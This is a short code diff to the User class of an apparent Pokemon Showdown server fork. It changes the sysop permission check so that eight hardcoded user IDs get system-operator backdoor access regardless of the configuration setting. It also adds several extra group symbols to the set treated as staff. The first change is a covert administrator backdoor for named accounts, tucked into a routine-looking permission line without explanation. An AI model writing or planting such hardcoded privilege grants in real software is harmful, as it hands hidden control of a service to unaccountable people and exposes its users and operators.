@@ -558,7 +558,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || ["volco", "gyaratoast", "emge4volco", "illuminativolco", "returningavenger", "sparkychild", "thegodofpie", "charliekobayashi"].indexOf(this.userid) > -1) {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
@@ -1073,7 +1073,7 @@ class User {
 			this.avatar = Config.customavatars[this.userid];
 		}
 
-		this.isStaff = (this.group in {'%':1, '@':1, '&':1, '~':1});
+		this.isStaff = (this.group in {'%':1, '@':1, '♗':1, '&':1,'¿':1, '⚔':1, '~':1, '◬':1, '►':1, '⚒':1, '✂':1,});
 		if (!this.isStaff) {
 			let staffRoom = Rooms('staff');
 			this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
